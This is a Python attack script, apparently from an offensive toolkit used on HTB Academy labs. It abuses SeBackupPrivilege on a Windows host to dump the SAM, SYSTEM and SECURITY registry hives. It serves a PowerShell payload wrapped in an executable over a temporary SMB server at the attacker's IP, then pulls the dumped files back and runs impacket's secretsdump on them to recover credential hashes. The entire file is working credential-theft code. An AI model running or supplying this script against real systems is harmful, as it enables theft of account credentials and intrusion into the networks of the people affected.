# This example can be used for SeBackupPrivileged users
# Tested on HTB Academy

from payload import SamDumpPowershell, CRunPowershellExe
from tempsmbserver import TempSMB
from stolen_tools.steal_tools import provide_privilege_token
from stolen_from_impacket.secretsdump import dump

local_ip = "10.10.16.101"

with TempSMB(local_ip=local_ip, set_credentials=True) as smb:
    sam_dump_payload = SamDumpPowershell(smb)
    enable_token_script = provide_privilege_token("SeBackupPrivilege")
    stitched_script = f"{enable_token_script}\n{sam_dump_payload.file.remote_path}"
    stitched_script_powershell = smb.create_temp_file(stitched_script, ext=".ps1")
    stitched_script_exe = CRunPowershellExe(smb, [stitched_script_powershell])

    print(f"{"="*10}ANGRY SMB READY{"="*10}")
    print(stitched_script_exe.file.remote_path)
    print(f"{"="*10}waiting{"="*10}")

    sam_dump_payload.await_output_files(timeout=20)
    try:
        dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)
    except Exception as e:
        print(e)
        print("Sleep timer for awaiting the dumped files might be too short")
